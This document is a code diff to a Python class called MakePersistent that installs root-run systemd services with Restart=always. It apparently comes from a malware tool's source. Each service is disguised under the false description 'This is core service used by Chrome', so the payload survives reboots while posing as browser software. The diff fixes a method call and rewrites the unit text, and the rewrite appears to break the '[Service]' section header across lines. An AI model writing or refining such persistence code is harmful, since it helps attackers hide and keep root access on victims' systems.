@@ -16,25 +16,15 @@ class MakePersistent:
     @staticmethod
     def create_service_file_content(file_path):
 
-        service_file_content = f"""
-        [Unit]
-        Description=This is core service used by Chrome.
-        
-        [Service]
-        User=root
-        ExecStart={file_path}
-        Restart=always
-        
-        [Install]
-        WantedBy=multi-user.target
-        """
+        service_file_content = f"""[Unit]\nDescription=This is core service used by Chrome\n[
+        Service]\nUser=root\nExecStart={file_path}\nRestart=always\n[Install]\nWantedBy=multi-user.target\n """
 
         return service_file_content
 
     def create_persistence_linux(self):
         service_files = []
         for trigger in self.triggers:
-            service_name = self.get_file_name
+            service_name = self.get_file_name()
             try:
                 with open(f"/etc/systemd/system/{service_name}.service", "w+") as service_writer:
                     service_writer.write(self.create_service_file_content(file_path=trigger))
